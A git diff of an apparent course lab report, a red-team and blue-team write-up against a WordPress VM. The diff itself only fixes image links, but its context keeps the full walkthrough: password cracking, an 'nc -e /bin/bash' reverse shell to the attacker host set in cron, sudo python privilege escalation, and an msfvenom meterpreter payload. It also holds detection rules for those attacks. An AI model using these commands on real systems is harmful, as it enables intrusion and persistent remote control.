@@ -16,16 +16,16 @@ Nmap scan results for each machine reveal the below services and OS details:
 To enumerate the network
 `nmap 192.168.1.0/24`
 
- ![overall1](P3_Images/P3_namap_overall_1)
+ ![overall1](P3_Images/P3_namap_overall_1.png)
 
- ![overall2](P3_Images/P3_namap_overall_2)
+ ![overall2](P3_Images/P3_namap_overall_2.png)
 
 Target 1 scan:
 `nmap -A 192.168.1.110`
 
- ![nmap_a_1](P3_Images/P3T1_nmap_a_1)
+ ![nmap_a_1](P3_Images/P3T1_nmap_a_1.png)
 
- ![nmap_a_2](P3_Images/P3T1_nmap_a_2)
+ ![nmap_a_2](P3_Images/P3T1_nmap_a_2.png)
 
 
 This scan identifies the services below as potential points of entry:
@@ -58,18 +58,18 @@ Scans
 - Discovered Python Privilege escalation with 
   - `sudo -l`:
 
-    ![sudo_l](P3_Images/P3T1_steven_sudo-l)
+    ![sudo_l](P3_Images/P3T1_steven_sudo-l.png)
 
 - Metasploit scans:
   - Auxiliary/scanner/http/wordpress_xmlrpc_login
 
-  ![xmlrpc_login](P3_Images/P3T1_aux_scanner_wordpress_xmlrpc_login)
+  ![xmlrpc_login](P3_Images/P3T1_aux_scanner_wordpress_xmlrpc_login.png)
   - Auxiliary/dos/http/wordpress_xmlrpc_dos
 
-  ![xmlrpc_dos](P3_Images/P3T1_aux_dos_http_wordpress_xmlrpc_dos)
+  ![xmlrpc_dos](P3_Images/P3T1_aux_dos_http_wordpress_xmlrpc_dos.png)
   - Negative results: target not vulnerable to GHOST: Auxiliary/scanner/http/wordpress_ghost_scanner
 
-  ![GHOST](P3_Images/P3T1_ghost_scan)
+  ![GHOST](P3_Images/P3T1_ghost_scan.png)
 
 
 ## Exploitation
@@ -111,9 +111,9 @@ The Red Team was able to penetrate Target 1 and retrieve the requested confident
     - `set VERBOSE true`
     - `exploit`
 
-    ![michael_options](P3_Images/P3T1_msfconsole_options_michael)
+    ![michael_options](P3_Images/P3T1_msfconsole_options_michael.png)
 
-    ![michael_password](P3_Images/P3T1_find_michael_password)
+    ![michael_password](P3_Images/P3T1_find_michael_password.png)
     
     - User michael password is michael.  This exploit did not find the password for steven.
 
@@ -122,7 +122,7 @@ The Red Team was able to penetrate Target 1 and retrieve the requested confident
     - `ssh michael@192.168.1.110 -p 22` 
     - #password: `Michael`
 
-    ![michael_ssh](P3_Images/P3T1_michael_ssh)
+    ![michael_ssh](P3_Images/P3T1_michael_ssh.png)
   
   
   - I searched the system for the designated data and for additional information that would help maintain access to the system. 
@@ -133,7 +133,7 @@ The Red Team was able to penetrate Target 1 and retrieve the requested confident
         - `ls`
         - `cat flag2.txt`
 
-        ![flag2](P3_Images/P3T1_flag2_1st_time)
+        ![flag2](P3_Images/P3T1_flag2_1st_time.png)
 
       - For **flag1:**
         - `cd /var/www/html`
@@ -141,13 +141,13 @@ The Red Team was able to penetrate Target 1 and retrieve the requested confident
 
         found flag1 inside the service.html file.
 
-        ![flag1](P3_Images/P3T1_flag1)
+        ![flag1](P3_Images/P3T1_flag1.png)
 
     - Located the Wordpress configuration file in /var/www/html/wordpress.  This file enumerated the username and password for the MySQL database, which we used to gain access to the database [1].
       - `cd /var/www/html/wordpress`
       - `cat wp-config.php`
 
-      ![wp-config_php](P3_Images/P3T1_wp-config)
+      ![wp-config_php](P3_Images/P3T1_wp-config.png)
 
       #MySQL DB user name = root
 
@@ -159,11 +159,11 @@ The Red Team was able to penetrate Target 1 and retrieve the requested confident
       - `use wordpress;`
       - `show tables;`
 
-      ![database_tables](P3_Images/P3T1_mysql_database_wordpress_tables)
+      ![database_tables](P3_Images/P3T1_mysql_database_wordpress_tables.png)
 
       - `describe wp_users;`
     
-      ![wp_users](P3_Images/P3T1_wp_users_fields)
+      ![wp_users](P3_Images/P3T1_wp_users_fields.png)
 
       - `select user_login, user_pass from wp_users;`
 
@@ -174,13 +174,13 @@ The Red Team was able to penetrate Target 1 and retrieve the requested confident
 
       - Found **flag3** and **flag4.**
 
-        ![flag3_4](P3_Images/P3T1_mysql_flag3_and_4)
+        ![flag3_4](P3_Images/P3T1_mysql_flag3_and_4.png)
 
       - Alternate method for locating **flag4:**
         - `cd /`
         - `ls`
 
-        ![altflag4](P3_Images/P3T1_full_flag4)
+        ![altflag4](P3_Images/P3T1_full_flag4.png)
 
   - In order to extend access, used John to crack the hashed passwords:
 
@@ -190,7 +190,7 @@ The Red Team was able to penetrate Target 1 and retrieve the requested confident
     
       Since we had user michael’s password already, stopped the process.
 
-      ![steven_password](P3_Images/P3T1_steven_password)
+      ![steven_password](P3_Images/P3T1_steven_password.png)
 
 
 3. **Maintaining Access**
@@ -201,7 +201,7 @@ The Red Team was able to penetrate Target 1 and retrieve the requested confident
       - `30 7 * * * nc 192.168.1.90 4444 -e /bin/bash`
     `nc 192.168.1.90 4444 -e /bin/bash`
 
-      ![crontab](P3_Images/P3T1_reverse_shell_michael)
+      ![crontab](P3_Images/P3T1_reverse_shell_michael.png)
     
     - on kali attacker machine run:
       - `nc -lnvp 4444`
@@ -210,7 +210,7 @@ The Red Team was able to penetrate Target 1 and retrieve the requested confident
         - `whoami`
         - `pwd`
 
-      ![listener](P3_Images/P3T1_nc_lvnp_4444_michael)
+      ![listener](P3_Images/P3T1_nc_lvnp_4444_michael.png)
 
   - Since an attacker has a higher chance of maintaining access if they have multiple compromised points, I moved on to user steven.
 
@@ -223,7 +223,7 @@ The Red Team was able to penetrate Target 1 and retrieve the requested confident
       - `sudo -l`
       - Saw that steven had sudo access through python.
 
-      ![sudo_l](P3_Images/P3T1_steven_sudo-l)
+      ![sudo_l](P3_Images/P3T1_steven_sudo-l.png)
 
     - To escalate privileges:
       - `sudo python -c ‘import pty;pty.spawn(“bin/bash”)’`
@@ -233,7 +233,7 @@ The Red Team was able to penetrate Target 1 and retrieve the requested confident
       - `sudo python -c ‘import os; os.system(“bash”)’`
       - Gain sudo/root
 
-      ![python_privilege](P3_Images/P3T1_steven_python_gain_root_command)
+      ![python_privilege](P3_Images/P3T1_steven_python_gain_root_command.png)
 
     - Used Metasploit to gain persistence for user steven:
       - `msfconsole`
@@ -244,7 +244,7 @@ The Red Team was able to penetrate Target 1 and retrieve the requested confident
       - `set PASSWORD pink84`
       - `exploit`
 
-      ![steven_sshexec](P3_Images/P3T1_steven_sshexec)
+      ![steven_sshexec](P3_Images/P3T1_steven_sshexec.png)
 
     - Crafted payload with msfvenom:
       - `msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.90 LPORT=4444 -f raw -o /tmp/pythonwhoo.py`
@@ -255,7 +255,7 @@ The Red Team was able to penetrate Target 1 and retrieve the requested confident
     - In the existing Meterpreter session, executed the payload:
       - `execute -f pythonwhoo.py`
 
-      ![Deploy_custom_package](P3_Images/P3T1_execute_pythonwhoo)
+      ![Deploy_custom_package](P3_Images/P3T1_execute_pythonwhoo.png)
 
     - In another session, I started the exploit:
       - `exploit python/meterpreter/reverse_tcp`
@@ -264,7 +264,7 @@ The Red Team was able to penetrate Target 1 and retrieve the requested confident
     - This gained the reverse TCP handler connection, and I was able to confirm the connection:
       - `pwd`
    
-       ![reverse_tcp](P3_Images/P3T1_reverse_tcp_steven)
+       ![reverse_tcp](P3_Images/P3T1_reverse_tcp_steven.png)
 
 
 ## References:
@@ -376,8 +376,8 @@ SSH Traffic is implemented as follows:
 - Full rule: packetbeat-* WHEN min() OF destination.port OVER all documents IS BETWEEN 21 and 23 FOR THE LAST 1 minute.
 - Reliability: Medium reliability. If SSH is routinely used for legitimate purposes, then this alert will generate false positives.
 
-![SSH_Traffic](P3_Images/P3BT_SSH_Traffic)
-![SSH_Traffic_graph](P3_Images/P3BT_SSH_traffic_part2)
+![SSH_Traffic](P3_Images/P3BT_SSH_Traffic.png)
+![SSH_Traffic_graph](P3_Images/P3BT_SSH_traffic_part2.png)
 
 **Excessive HTTP Errors Alert**
 
@@ -389,8 +389,8 @@ Excessive HTTP Errors is implemented as follows:
 - Full Rule: packetbeat-* WHEN count () GROUPED OVER top 5 `http.response.status_code` IS ABOVE 400 FOR THE LAST 5 minutes
 - Reliability: High reliability. It detected our WordPress Scan (wpscan), our attempts to utilize Metasploit’s /auxiliary/scanner/http/wordpress_xmlrpc_login and auxiliary/dos/http/wordpress_xmlrpc_dos. 
 
-![Excessive_HTTP_Errors](P3_Images/P3BT_Excessive_HTTP_errors)
-![Excessive_HTTP_Errors_graph](P3_Images/P3BT_http_errors)
+![Excessive_HTTP_Errors](P3_Images/P3BT_Excessive_HTTP_errors.png)
+![Excessive_HTTP_Errors_graph](P3_Images/P3BT_http_errors.png)
 
 **HTTP Request Size Monitor Alert**
 
@@ -402,8 +402,8 @@ HTTP Request Size Monitor is implemented as follows:
 - Full Rule: packetbeat-* WHEN sum() OF http.request.bytes OVER all documents IS ABOVE 3500 FOR THE LAST 1 minute
 - Reliability: Low reliability. While this did fire during some Red Team activity, it also appears to fire when the system is not under attack.  It also failed to fire during some Red Team attempts.
 
-![HTTP_Request_Size](P3_Images/P3BT_HTTP_Request_Size)
-![HTTP_Request_Size_graph](P3_Images/P3BT_HTTP_request_size_monitor)
+![HTTP_Request_Size](P3_Images/P3BT_HTTP_Request_Size.png)
+![HTTP_Request_Size_graph](P3_Images/P3BT_HTTP_request_size_monitor.png)
 
 **Listener Alert**
 
@@ -415,8 +415,8 @@ Listener Alert is implemented as follows:
 - Full Rule: packetbeat-* WHEN count () OF destination.port OVER all documents IS BETWEEN 4000 and 5000 FOR THE LAST 1 minute
 - Reliability: High reliability.  This alert fired during all Red Team activity utilizing a Reverse Shell with the targeted system directing traffic to 192.168.1.90:4444.  However, if the attack set the listener outside this port range, the alert would not activate.
 
-![Listener_alert](P3_Images/P3BT_listener_alert)
-![Listener_graph](P3_Image/P3BT_listener_alert_search)
+![Listener_alert](P3_Images/P3BT_listener_alert.png)
+![Listener_graph](P3_Image/P3BT_listener_alert_search.png)
 
 **CPU Usage Monitor Alert**
 
@@ -440,7 +440,7 @@ User has sudo access for python, allowing privilege escalation via spawning a ba
   - Remove sudo access for python for the user.
   - If the user requires this access, then craft an alert or report that will watch for “bash” within a sudo command (system.auth.sudo.command: “bash”)
 - Why It Works:  If this access is removed, this method of privilege escalation is closed.  If the access is required and has legitimate uses, such as the user routinely needs to access python, then monitoring for suspicious commands is needed (5).
-![Bash_example](P3_Images/P3BT_bash_search)
+![Bash_example](P3_Images/P3BT_bash_search.png)
 
 **Weak and Exposed Passwords / SSH Login**
 Users on the system had short, weak passwords. In addition, passwords were exposed within files in both plaintext and hashed form in files that were accessible by users with weak passwords.
@@ -471,4 +471,4 @@ Users on the system had short, weak passwords. In addition, passwords were expos
 6. https://www.offensive-security.com/metasploit-unleashed/scanner-ssh-auxiliary-modules/ 
 7. https://nest.parrot.sh/packages/tools/metasploit-framework/blob/master/documentation/modules/auxiliary/scanner/ssh/ssh_login_pubkey.md 
 
-[Back to Portfolio](README.md)
+[Back to Portfolio](https://github.com/bethwjohnson/portfolio)
